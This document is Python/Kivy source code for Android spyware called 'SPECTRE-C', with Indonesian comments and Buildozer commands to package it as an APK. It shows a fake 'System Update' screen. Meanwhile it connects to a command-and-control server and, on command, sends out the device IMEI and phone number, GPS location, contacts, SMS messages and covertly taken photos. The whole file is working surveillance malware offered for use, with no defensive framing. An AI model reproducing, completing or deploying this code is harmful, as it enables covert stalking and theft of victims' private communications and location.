# SPECTRE-C: Python Android Spyware
# Build dengan Buildozer → .apk siap deploy
# pip install buildozer cython
# buildozer -v android debug

from kivy.app import App
from kivy.uix.label import Label
from kivy.clock import Clock
import threading, socket, json, os, time, base64

C2_HOST = "192.168.1.100"
C2_PORT = 4445

class SpectreService:
    def __init__(self):
        self.sock  = None
        self.running = False

    def connect(self):
        while True:
            try:
                self.sock = socket.socket()
                self.sock.connect((C2_HOST, C2_PORT))
                self.running = True
                self.beacon()
                self.loop()
            except:
                time.sleep(15)

    def send(self, data):
        try:
            self.sock.sendall((json.dumps(data) + "\n").encode())
        except: pass

    def beacon(self):
        from android import mActivity
        ctx = mActivity.getApplicationContext()
        info = {
            "type":    "beacon",
            "model":   android.os.Build.MODEL,
            "android": str(android.os.Build.VERSION.RELEASE),
            "pkg":     str(ctx.getPackageName()),
        }
        try:
            import jnius
            tm = jnius.autoclass("android.telephony.TelephonyManager")
            mgr = mActivity.getSystemService("phone")
            info["imei"]  = mgr.getDeviceId() or ""
            info["phone"] = mgr.getLine1Number() or ""
        except: pass
        self.send(info)

    def get_location(self):
        try:
            from plyer import gps
            gps.configure(on_location=self._on_loc)
            gps.start(minTime=0, minDistance=0)
            time.sleep(3)
        except: pass

    def _on_loc(self, **kwargs):
        self.send({
            "type": "gps",
            "lat":  kwargs.get("lat"),
            "lon":  kwargs.get("lon"),
            "alt":  kwargs.get("altitude"),
        })

    def get_contacts(self):
        try:
            import jnius
            ctx = jnius.autoclass("org.kivy.android.PythonActivity").mActivity
            cr  = ctx.getContentResolver()
            cur = cr.query(
                jnius.autoclass("android.provider.ContactsContract$CommonDataKinds$Phone").CONTENT_URI,
                None, None, None, None)
            contacts = []
            while cur.moveToNext():
                name = cur.getString(cur.getColumnIndex("display_name")) or ""
                num  = cur.getString(cur.getColumnIndex("data1")) or ""
                contacts.append({"name": name, "num": num})
            cur.close()
            self.send({"type":"contacts","data":contacts[:200]})
        except Exception as e:
            self.send({"type":"contacts","err":str(e)})

    def get_sms(self):
        try:
            import jnius
            ctx = jnius.autoclass("org.kivy.android.PythonActivity").mActivity
            cr  = ctx.getContentResolver()
            cur = cr.query(
                jnius.autoclass("android.net.Uri").parse("content://sms/inbox"),
                None, None, None, "date DESC LIMIT 100")
            sms = []
            while cur.moveToNext():
                sms.append({
                    "from":    cur.getString(cur.getColumnIndex("address")) or "",
                    "body":    cur.getString(cur.getColumnIndex("body")) or "",
                    "date":    cur.getLong(cur.getColumnIndex("date")),
                })
            cur.close()
            self.send({"type":"sms","data":sms})
        except Exception as e:
            self.send({"type":"sms","err":str(e)})

    def take_photo(self, camera=0):
        try:
            from plyer import camera as cam
            path = "/sdcard/.xc_cam.jpg"
            cam.take_picture(filename=path, on_complete=lambda fn: self._send_file("photo", fn))
        except Exception as e:
            self.send({"type":"photo","err":str(e)})

    def _send_file(self, ftype, path):
        try:
            with open(path,"rb") as f:
                data = base64.b64encode(f.read()).decode()
            self.send({"type":ftype,"data":data,"path":path})
            os.remove(path)
        except: pass

    def loop(self):
        while self.running:
            try:
                buf = b""
                while not buf.endswith(b"\n"):
                    chunk = self.sock.recv(4096)
                    if not chunk: raise ConnectionError
                    buf += chunk
                cmd = json.loads(buf.strip())
                t = cmd.get("cmd","")
                if   t == "location":  threading.Thread(target=self.get_location, daemon=True).start()
                elif t == "contacts":  threading.Thread(target=self.get_contacts, daemon=True).start()
                elif t == "sms":       threading.Thread(target=self.get_sms, daemon=True).start()
                elif t == "photo":     threading.Thread(target=self.take_photo, daemon=True).start()
                elif t == "ping":      self.send({"type":"pong"})
            except: break
        self.running = False

class SpectreApp(App):
    def build(self):
        # Jalankan spy service di background thread
        svc = SpectreService()
        threading.Thread(target=svc.connect, daemon=True).start()
        # UI palsu biar keliatan normal
        return Label(text="System Update\nPlease wait...", color=(0.2,0.2,0.2,1))

    def on_pause(self): return True
    def on_resume(self): pass

if __name__ == "__main__":
    SpectreApp().run()
